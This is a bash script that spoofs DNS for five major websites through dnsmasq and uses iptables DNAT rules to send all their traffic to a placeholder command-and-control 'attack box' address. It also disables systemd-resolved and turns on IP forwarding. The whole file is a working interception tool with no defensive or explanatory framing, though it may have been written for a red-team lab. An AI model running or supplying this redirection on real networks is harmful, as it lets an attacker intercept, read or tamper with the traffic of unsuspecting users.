#!/bin/bash

# Path to dnsmasq configuration file
dnsmasq_conf="/etc/dnsmasq.conf"
interface="ens33"
C2="INSERT C2 IP"

# Predefined set of IPs and domain names
declare -a ips=("8.8.8.8" "31.13.66.35" "142.251.163.190" "205.251.242.103" "104.244.42.193")
declare -a domains=("google.com" "facebook.com" "youtube.com" "amazon.com" "twitter.com")

# Backup the original configuration file
sudo cp $dnsmasq_conf "${dnsmasq_conf}.backup"
echo "Original dnsmasq configuration backed up."

# Stop and Disable systemd-resolved
sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved

# Stop DNSMASQ 
sudo systemctl stop dnsmasq

# Enable IP forwarding
echo "Enabling IP forwarding..."
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo sysctl -w net.ipv4.ip_forward=1

# Add domain to IP mappings and configure virtual interfaces
for i in "${!ips[@]}"; do
    sudo ip addr add "${ips[$i]}/24" dev ${interface}:$((i+1))
    echo "Virtual interface ${interface}:$((i+1)) with IP ${ips[$i]} created."
    echo "address=/${domains[$i]}/${ips[$i]}" | sudo tee -a $dnsmasq_conf
    echo "Mapped domain ${domains[$i]} to ${ips[$i]}."

    # Redirect traffic from each virtual IP to the attack box

    sudo iptables -t nat -A PREROUTING -d "${ips[$i]}" -j DNAT --to-destination $C2
    sudo iptables -t nat -A POSTROUTING -j MASQUERADE
    echo "Redirected traffic for ${domains[$i]} (${ips[$i]}) to attack box $C2."
done

# Restart dnsmasq to apply changes
sudo systemctl restart dnsmasq
echo "dnsmasq has been restarted with the new configuration."

echo "Traffic redirection setup is complete."
